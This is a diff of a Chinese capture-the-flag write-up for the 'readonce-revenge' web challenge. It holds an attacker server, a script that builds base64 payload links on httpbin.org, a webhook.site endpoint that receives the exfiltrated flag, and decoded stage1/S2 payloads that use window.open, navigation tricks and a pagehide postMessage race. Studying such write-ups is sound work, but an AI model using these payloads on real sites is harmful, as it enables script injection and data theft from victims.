@@ -350,13 +350,13 @@ app.get("/note/:id", (req, res) => {
 
 #### 2.5.1 前置：攻击者服务器（stage1 / S2 / 收信）
 
-> 先提前将一些概念。提交网址指向的页面由我们自己的服务器提供。
+> 先提前讲一些概念。提交网址指向的页面由我们自己的服务器提供。
 
 **关于 `host.docker.internal`**
 
 它不是注册域名，而是 Docker Desktop（Mac/Windows）内置的特殊名称：容器内向它发请求，会被转到宿主机。本节里机器人（在容器里）访问攻击者服务器（在宿主机上），地址就得写它；你自己在宿主机上想访问攻击者服务器时，用 `localhost:9975` 即可。Linux 上 Docker 默认不提供这个名称，需要按六章常见问题里的办法加 `extra_hosts`。
 
-（stage1：机器人最终打开的那个攻击者页面；S2：随后被审查界面加载的脚本；收信：接收 flag 的端点。三者的具体内容见代码块后的路由说明。）
+（stage1：机器人最终打开的那个攻击者页面；S2：随后被审查界面加载的脚本；收信：接收 flag 的端点。这三个角色分别对应 2.5.2 里本地服务器的三个路由，对应关系写在 2.5.2 的路由说明里。）
 
 **真实 CTF（远程靶机）时的地址**
 
@@ -375,7 +375,7 @@ app.get("/note/:id", (req, res) => {
 
 #### 2.5.2 本地验证运行的攻击服务器和攻击源码
 
-把下面代码存成 `attacker.js` 并运行 `node attacker.js`（监听本机 9975 端口；机器人从容器里经 `host.docker.internal:9975` 访问它）：
+2.5.1 讲了攻击者服务器的三个角色（stage1 / S2 / 收信）；本节是它们在本地复现里的实现：把下面代码存成 `attacker.js` 并运行 `node attacker.js`（监听本机 9975 端口；机器人从容器里经 `host.docker.internal:9975` 访问它）：
 
 ```js
 const http = require("node:http");
@@ -411,11 +411,37 @@ srv.listen(PORT, () => console.log("attacker server listening on port", PORT));
 
 运行输出：`attacker server listening on port 9975`
 
-三个路由各自将在主线的不同阶段被请求，现在只需知道它们的存在：
+三个路由与 2.5.1 的三个角色一一对应，各自将在主线的不同阶段被请求，现在只需知道它们的存在：
 
-- `/stage1`：机器人最终打开的攻击者页面（内含两段动作：弹窗打开审查界面、主页面连续自导航）；
-- `/s2p.js`：审查界面的沙箱 iframe 之后会加载它；
-- `/f`：收信路由（渲染外传阶段，flag 会作为查询串到达这里并打印）。
+- `/stage1`：对应 **stage1**，即机器人最终打开的攻击者页面（内含两段动作：弹窗打开审查界面、主页面连续自导航）；
+- `/s2p.js`：对应 **S2**，审查界面的沙箱 iframe 之后会加载它；
+- `/f`：对应**收信**，渲染外传阶段，flag 会作为查询串到达这里并打印。
+
+**远程场景下这三个路由的链接怎么生成**
+
+真实 CTF 里本机没有公网 IP（2.5.1），要把上面三个路由搬到公网载体上，链接这样生成：
+
+1. **`/s2p.js` 的链接（先生成它）**：把本路由返回的脚本存成 `s2.js`，做 base64 编码（`python3 -c "import base64;print(base64.b64encode(open('s2.js','rb').read()).decode())"`），拼到前缀后面，得到 `https://httpbin.org/base64/<编码>`；
+2. **`/stage1` 的链接**：把本路由返回的 HTML 存成 `stage1.html`，但 `u=` 参数的值换成上一步的 S2 链接（URL 编码后填进去）；再对整份 HTML 做同样的 base64 编码，拼成 `https://httpbin.org/base64/<编码>`；提交 `/report` 时在末尾追加 `?note=<当轮笔记编号>`；
+3. **`/f` 的接收链接**：`curl -X POST https://webhook.site/token` 建一个免费 token，响应 JSON 里的 `uuid` 拼成 `https://webhook.site/<uuid>`，flag 外传时打到这里。
+
+顺序要点：先 S2、再 stage1（stage1 依赖 S2 链接，且要 URL 编码后再填）；base64 只对内容本身做；`?note=` 只在提交时追加，不进 base64。等价的生成脚本（可直接照抄）：
+
+```python
+import base64, urllib.parse
+
+# 1) S2 链接
+S2 = open("s2.js", "r").read()
+S2_URL = "https://httpbin.org/base64/" + base64.b64encode(S2.encode()).decode()
+
+# 2) stage1 链接（模板里 u= 处写成 %s）
+stage1_html = open("stage1_template.html", "r").read() % urllib.parse.quote(S2_URL, safe="")
+report_url = "https://httpbin.org/base64/" + base64.b64encode(stage1_html.encode()).decode()
+# 提交时：report_url + "?note=<编号>"
+
+# 3) 接收链接
+# curl -X POST https://webhook.site/token   → uuid → https://webhook.site/<uuid>
+```
 
 （这段代码就是第五章完整脚本的服务部分；第五章把本节后续的提交与等待也自动化了。）
 
@@ -1427,43 +1453,42 @@ docker logs -f readonce-revenge-challenge-1
 | 本地复现时的机器人浏览器 | 本机 Chromium（playwright 缓存，headless 无界面模式） |
 | Docker 端口 | `3000:3000` |
 
-### 附 D：远程载体的完整链接（真实比赛时用的 httpbin 地址）
+### 附 D：远程载体的完整链接（httpbin 版本，可直接复现）
 
-两条链接都是 httpbin 的 base64 端点：它会把 URL 里的 base64 解码后原样返回（响应不带 CSP）。用浏览器或 curl 直接打开即可核对。
+两条链接都是 httpbin 的 base64 端点：它会把 URL 里的 base64 解码后原样返回（响应不带 CSP）。用浏览器或 curl 直接打开即可核对；本附录用最终有效的攻击版本（pagehide 竞态 S2 + 两段式 stage1）生成。
 
 **S2 脚本的地址**
 
 ```text
-https://httpbin.org/base64/bGV0IG49MDsgY29uc3QgaXY9c2V0SW50ZXJ2YWwoKCk9PntuKys7dHJ5e3BhcmVudC5wb3N0TWVzc2FnZSh7djE0Om59LCcqJyl9Y2F0Y2goZSl7fX0sMSk7CnRyeXtjb25zdCBmPWRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2lmcmFtZScpO2Yuc3JjZG9jPSc8c2NyaXB0PmxldCBtPTA7c2V0SW50ZXJ2YWwoKCk9PnttKys7dHJ5e3BhcmVudC5wYXJlbnQucG9zdE1lc3NhZ2Uoe3YxNGNoaWxkOm19LCIqIil9Y2F0Y2goZSl7fX0sMSk8XC9zY3JpcHQ+Jztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGYpO31jYXRjaChlKXt9CnRyeXtkb2N1bWVudC5ib2R5LmlubmVySFRNTCs9JzxpZnJhbWUgc3JjZG9jPSI8c2NyaXB0PmxldCBrPTA7c2V0SW50ZXJ2YWwoKCk9PntrKys7dHJ5e3BhcmVudC5wYXJlbnQucG9zdE1lc3NhZ2Uoe3YxNGloOmt9KX1jYXRjaChlKXt9fSwxKTxcL3NjcmlwdD4iPic7fWNhdGNoKGUpe30KdHJ5e2NvbnN0IGYyPWRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2lmcmFtZScpO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoZjIpO2NvbnN0IGQ9ZjIuY29udGVudERvY3VtZW50O2lmKGQmJmQuYm9keSl7Y29uc3Qgcz1kLmNyZWF0ZUVsZW1lbnQoJ3NjcmlwdCcpO3MudGV4dENvbnRlbnQ9J2xldCBqPTA7c2V0SW50ZXJ2YWwoKCk9PntqKys7dHJ5e3BhcmVudC5wYXJlbnQucG9zdE1lc3NhZ2Uoe3YxNGJsYW5rOmp9KX1jYXRjaChlKXt9fSwxKSc7ZC5ib2R5LmFwcGVuZENoaWxkKHMpO319Y2F0Y2goZSl7fQp0cnl7Y29uc3QgZjM9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnaWZyYW1lJyk7ZjMuc3JjPSdhYm91dDpibGFuayc7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChmMyk7c2V0VGltZW91dCgoKT0+e3RyeXtmMy5jb250ZW50V2luZG93LmV2YWwoJ2xldCBxPTA7c2V0SW50ZXJ2YWwoKCk9PntxKys7dHJ5e3BhcmVudC5wYXJlbnQucG9zdE1lc3NhZ2Uoe3YxNGV2YWw6cX0sIioiKX1jYXRjaChlKXt9fSwxKScpfWNhdGNoKGUpe319LDEwMCk7fWNhdGNoKGUpe30=
+https://httpbin.org/base64/YWRkRXZlbnRMaXN0ZW5lcigicGFnZWhpZGUiLCBmdW5jdGlvbigpeyB0cnkgeyB0b3AucG9zdE1lc3NhZ2Uoe3A6MX0sICIqIik7IHRvcC5wb3N0TWVzc2FnZSh7cDoyfSwgIioiKTsgfSBjYXRjaChlKXt9IH0pOw==
 ```
 
 **stage1 页面的地址**（提交时末尾追加 `?note=<编号>`；下面链接里用 EXAMPLE 占位）
 
 ```text
-https://httpbin.org/base64/PCFkb2N0eXBlIGh0bWw+PGJvZHk+PHNjcmlwdD4KY29uc3QgcT1uZXcgVVJMU2VhcmNoUGFyYW1zKGxvY2F0aW9uLnNlYXJjaCk7CmNvbnN0IHJpZD1xLmdldCgncmlkJyksbm90ZT1xLmdldCgnbm90ZScpOwp0cnl7d2luZG93Lm9wZW4oJ2h0dHA6Ly9sb2NhbGhvc3Q6MzAwMC9yZXZpZXc/dT0nKydodHRwcyUzQSUyRiUyRmh0dHBiaW4ub3JnJTJGYmFzZTY0JTJGYkdWMElHNDlNRHNnWTI5dWMzUWdhWFk5YzJWMFNXNTBaWEoyWVd3b0tDazlQbnR1S3lzN2RISjVlM0JoY21WdWRDNXdiM04wVFdWemMyRm5aU2g3ZGpFME9tNTlMQ2NxSnlsOVkyRjBZMmdvWlNsN2ZYMHNNU2s3Q25SeWVYdGpiMjV6ZENCbVBXUnZZM1Z0Wlc1MExtTnlaV0YwWlVWc1pXMWxiblFvSjJsbWNtRnRaU2NwTzJZdWMzSmpaRzlqUFNjOGMyTnlhWEIwUG14bGRDQnRQVEE3YzJWMFNXNTBaWEoyWVd3b0tDazlQbnR0S3lzN2RISjVlM0JoY21WdWRDNXdZWEpsYm5RdWNHOXpkRTFsYzNOaFoyVW9lM1l4TkdOb2FXeGtPbTE5TENJcUlpbDlZMkYwWTJnb1pTbDdmWDBzTVNrOFhDOXpZM0pwY0hRJTJCSnp0a2IyTjFiV1Z1ZEM1aWIyUjVMbUZ3Y0dWdVpFTm9hV3hrS0dZcE8zMWpZWFJqYUNobEtYdDlDblJ5ZVh0a2IyTjFiV1Z1ZEM1aWIyUjVMbWx1Ym1WeVNGUk5UQ3M5Snp4cFpuSmhiV1VnYzNKalpHOWpQU0k4YzJOeWFYQjBQbXhsZENCclBUQTdjMlYwU1c1MFpYSjJZV3dvS0NrOVBudHJLeXM3ZEhKNWUzQmhjbVZ1ZEM1d1lYSmxiblF1Y0c5emRFMWxjM05oWjJVb2UzWXhOR2xvT210OUtYMWpZWFJqYUNobEtYdDlmU3d4S1R4Y0wzTmpjbWx3ZEQ0aVBpYzdmV05oZEdOb0tHVXBlMzBLZEhKNWUyTnZibk4wSUdZeVBXUnZZM1Z0Wlc1MExtTnlaV0YwWlVWc1pXMWxiblFvSjJsbWNtRnRaU2NwTzJSdlkzVnRaVzUwTG1KdlpIa3VZWEJ3Wlc1a1EyaHBiR1FvWmpJcE8yTnZibk4wSUdROVpqSXVZMjl1ZEdWdWRFUnZZM1Z0Wlc1ME8ybG1LR1FtSm1RdVltOWtlU2w3WTI5dWMzUWdjejFrTG1OeVpXRjBaVVZzWlcxbGJuUW9KM05qY21sd2RDY3BPM011ZEdWNGRFTnZiblJsYm5ROUoyeGxkQ0JxUFRBN2MyVjBTVzUwWlhKMllXd29LQ2s5UG50cUt5czdkSEo1ZTNCaGNtVnVkQzV3WVhKbGJuUXVjRzl6ZEUxbGMzTmhaMlVvZTNZeE5HSnNZVzVyT21wOUtYMWpZWFJqYUNobEtYdDlmU3d4S1NjN1pDNWliMlI1TG1Gd2NHVnVaRU5vYVd4a0tITXBPMzE5WTJGMFkyZ29aU2w3ZlFwMGNubDdZMjl1YzNRZ1pqTTlaRzlqZFcxbGJuUXVZM0psWVhSbFJXeGxiV1Z1ZENnbmFXWnlZVzFsSnlrN1pqTXVjM0pqUFNkaFltOTFkRHBpYkdGdWF5YzdaRzlqZFcxbGJuUXVZbTlrZVM1aGNIQmxibVJEYUdsc1pDaG1NeWs3YzJWMFZHbHRaVzkxZENnb0tUMCUyQmUzUnllWHRtTXk1amIyNTBaVzUwVjJsdVpHOTNMbVYyWVd3b0oyeGxkQ0J4UFRBN2MyVjBTVzUwWlhKMllXd29LQ2s5UG50eEt5czdkSEo1ZTNCaGNtVnVkQzV3WVhKbGJuUXVjRzl6ZEUxbGMzTmhaMlVvZTNZeE5HVjJZV3c2Y1gwc0lpb2lLWDFqWVhSamFDaGxLWHQ5ZlN3eEtTY3BmV05oZEdOb0tHVXBlMzE5TERFd01DazdmV05oZEdOb0tHVXBlMzAlM0QnKycmcmlkPScrcmlkKycmbm90ZT0nK25vdGUsJ1JFVicpO31jYXRjaChlKXt9CmxldCBpPSsocS5nZXQoJ24nKXx8MCk7CmlmKGk8OCl7c2V0VGltZW91dCgoKT0+e2xvY2F0aW9uPWxvY2F0aW9uLnBhdGhuYW1lKyc/bj0nKygrK2kpKycmbm90ZT0nK25vdGU7fSwxMjApO30KZWxzZXtzZXRUaW1lb3V0KCgpPT57aGlzdG9yeS5nbygtKDIrOCkpO30sMjUwKTt9Cjwvc2NyaXB0Pg==?note=EXAMPLE
+https://httpbin.org/base64/PCFkb2N0eXBlIGh0bWw+PGJvZHk+UzE8c2NyaXB0Pgp2YXIgcmlkID0gbmV3IFVSTFNlYXJjaFBhcmFtcyhsb2NhdGlvbi5zZWFyY2gpLmdldCgicmlkIik7CnZhciBub3RlID0gbmV3IFVSTFNlYXJjaFBhcmFtcyhsb2NhdGlvbi5zZWFyY2gpLmdldCgibm90ZSIpOwp3aW5kb3cub3BlbigiaHR0cDovL2xvY2FsaG9zdDozMDAwL3Jldmlldz91PWh0dHBzJTNBJTJGJTJGaHR0cGJpbi5vcmclMkZiYXNlNjQlMkZZV1JrUlhabGJuUk1hWE4wWlc1bGNpZ2ljR0ZuWldocFpHVWlMQ0JtZFc1amRHbHZiaWdwZXlCMGNua2dleUIwYjNBdWNHOXpkRTFsYzNOaFoyVW9lM0E2TVgwc0lDSXFJaWs3SUhSdmNDNXdiM04wVFdWemMyRm5aU2g3Y0RveWZTd2dJaW9pS1RzZ2ZTQmpZWFJqYUNobEtYdDlJSDBwT3clM0QlM0QmcmlkPSIgKyByaWQgKyAiJm5vdGU9IiArIG5vdGUsICJSRVYiKTsKdmFyIHBoID0gbmV3IFVSTFNlYXJjaFBhcmFtcyhsb2NhdGlvbi5zZWFyY2gpLmdldCgicGgiKTsKdmFyIG5uID0gcGFyc2VJbnQobmV3IFVSTFNlYXJjaFBhcmFtcyhsb2NhdGlvbi5zZWFyY2gpLmdldCgibm4iKXx8IjAiKTsKaWYgKHBoID09PSAiZXZpY3QiKSB7CiAgaWYgKG5uIDwgOCkgeyBzZXRUaW1lb3V0KGZ1bmN0aW9uKCl7IGxvY2F0aW9uLmhyZWYgPSBsb2NhdGlvbi5wYXRobmFtZSArICI/cGg9ZXZpY3Qmbm49IiArIChubisxKTsgfSwgMTIwKTsgfQogIGVsc2UgeyBzZXRUaW1lb3V0KGZ1bmN0aW9uKCl7IGhpc3RvcnkuZ28oLTEwKTsgfSwgMjAwKTsgfQp9IGVsc2UgeyBzZXRUaW1lb3V0KGZ1bmN0aW9uKCl7IGxvY2F0aW9uLmhyZWYgPSBsb2NhdGlvbi5wYXRobmFtZSArICI/cGg9ZXZpY3Qmbm49MSI7IH0sIDM1MDApOyB9Cjwvc2NyaXB0Pg==
 ```
 
 解码后的原文（与上面两条 base64 一一对应，便于核对）：
 
 ```js
-let n=0; const iv=setInterval(()=>{n++;try{parent.postMessage({v14:n},'*')}catch(e){}},1);
-try{const f=document.createElement('iframe');f.srcdoc='<script>let m=0;setInterval(()=>{m++;try{parent.parent.postMessage({v14child:m},"*")}catch(e){}},1)<\/script>';document.body.appendChild(f);}catch(e){}
-try{document.body.innerHTML+='<iframe srcdoc="<script>let k=0;setInterval(()=>{k++;try{parent.parent.postMessage({v14ih:k})}catch(e){}},1)<\/script>">';}catch(e){}
-try{const f2=document.createElement('iframe');document.body.appendChild(f2);const d=f2.contentDocument;if(d&&d.body){const s=d.createElement('script');s.textContent='let j=0;setInterval(()=>{j++;try{parent.parent.postMessage({v14blank:j})}catch(e){}},1)';d.body.appendChild(s);}}catch(e){}
-try{const f3=document.createElement('iframe');f3.src='about:blank';document.body.appendChild(f3);setTimeout(()=>{try{f3.contentWindow.eval('let q=0;setInterval(()=>{q++;try{parent.parent.postMessage({v14eval:q},"*")}catch(e){}},1)')}catch(e){}},100);}catch(e){}
+addEventListener("pagehide", function(){ try { top.postMessage({p:1}, "*"); top.postMessage({p:2}, "*"); } catch(e){} });
 ```
 
 ```html
-<!doctype html><body><script>
-const q=new URLSearchParams(location.search);
-const rid=q.get('rid'),note=q.get('note');
-try{window.open('http://localhost:3000/review?u='+'https%3A%2F%2Fhttpbin.org%2Fbase64%2FbGV0IG49MDsgY29uc3QgaXY9c2V0SW50ZXJ2YWwoKCk9PntuKys7dHJ5e3BhcmVudC5wb3N0TWVzc2FnZSh7djE0Om59LCcqJyl9Y2F0Y2goZSl7fX0sMSk7CnRyeXtjb25zdCBmPWRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2lmcmFtZScpO2Yuc3JjZG9jPSc8c2NyaXB0PmxldCBtPTA7c2V0SW50ZXJ2YWwoKCk9PnttKys7dHJ5e3BhcmVudC5wYXJlbnQucG9zdE1lc3NhZ2Uoe3YxNGNoaWxkOm19LCIqIil9Y2F0Y2goZSl7fX0sMSk8XC9zY3JpcHQ%2BJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGYpO31jYXRjaChlKXt9CnRyeXtkb2N1bWVudC5ib2R5LmlubmVySFRNTCs9JzxpZnJhbWUgc3JjZG9jPSI8c2NyaXB0PmxldCBrPTA7c2V0SW50ZXJ2YWwoKCk9PntrKys7dHJ5e3BhcmVudC5wYXJlbnQucG9zdE1lc3NhZ2Uoe3YxNGloOmt9KX1jYXRjaChlKXt9fSwxKTxcL3NjcmlwdD4iPic7fWNhdGNoKGUpe30KdHJ5e2NvbnN0IGYyPWRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2lmcmFtZScpO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoZjIpO2NvbnN0IGQ9ZjIuY29udGVudERvY3VtZW50O2lmKGQmJmQuYm9keSl7Y29uc3Qgcz1kLmNyZWF0ZUVsZW1lbnQoJ3NjcmlwdCcpO3MudGV4dENvbnRlbnQ9J2xldCBqPTA7c2V0SW50ZXJ2YWwoKCk9PntqKys7dHJ5e3BhcmVudC5wYXJlbnQucG9zdE1lc3NhZ2Uoe3YxNGJsYW5rOmp9KX1jYXRjaChlKXt9fSwxKSc7ZC5ib2R5LmFwcGVuZENoaWxkKHMpO319Y2F0Y2goZSl7fQp0cnl7Y29uc3QgZjM9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnaWZyYW1lJyk7ZjMuc3JjPSdhYm91dDpibGFuayc7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChmMyk7c2V0VGltZW91dCgoKT0%2Be3RyeXtmMy5jb250ZW50V2luZG93LmV2YWwoJ2xldCBxPTA7c2V0SW50ZXJ2YWwoKCk9PntxKys7dHJ5e3BhcmVudC5wYXJlbnQucG9zdE1lc3NhZ2Uoe3YxNGV2YWw6cX0sIioiKX1jYXRjaChlKXt9fSwxKScpfWNhdGNoKGUpe319LDEwMCk7fWNhdGNoKGUpe30%3D'+'&rid='+rid+'&note='+note,'REV');}catch(e){}
-let i=+(q.get('n')||0);
-if(i<8){setTimeout(()=>{location=location.pathname+'?n='+(++i)+'&note='+note;},120);}
-else{setTimeout(()=>{history.go(-(2+8));},250);}
+<!doctype html><body>S1<script>
+var rid = new URLSearchParams(location.search).get("rid");
+var note = new URLSearchParams(location.search).get("note");
+window.open("http://localhost:3000/review?u=https%3A%2F%2Fhttpbin.org%2Fbase64%2FYWRkRXZlbnRMaXN0ZW5lcigicGFnZWhpZGUiLCBmdW5jdGlvbigpeyB0cnkgeyB0b3AucG9zdE1lc3NhZ2Uoe3A6MX0sICIqIik7IHRvcC5wb3N0TWVzc2FnZSh7cDoyfSwgIioiKTsgfSBjYXRjaChlKXt9IH0pOw%3D%3D&rid=" + rid + "&note=" + note, "REV");
+var ph = new URLSearchParams(location.search).get("ph");
+var nn = parseInt(new URLSearchParams(location.search).get("nn")||"0");
+if (ph === "evict") {
+  if (nn < 8) { setTimeout(function(){ location.href = location.pathname + "?ph=evict&nn=" + (nn+1); }, 120); }
+  else { setTimeout(function(){ history.go(-10); }, 200); }
+} else { setTimeout(function(){ location.href = location.pathname + "?ph=evict&nn=1"; }, 3500); }
 </script>
 ```
 
-构造方式（当时脚本里就是这么做的）：对内容做 base64 编码后拼到 `https://httpbin.org/base64/` 后面；stage1 的用法见 2.5 前置段的"真实 CTF（远程靶机）时的地址"。
+构造方式（与 2.5.2 的生成脚本一致）：S2 先做 base64 拼到前缀后面；stage1 的 `u=` 处填 URL 编码后的 S2 链接、整份再做同样的 base64；提交 `/report` 时追加 `?note=<编号>`。
 
 （完）
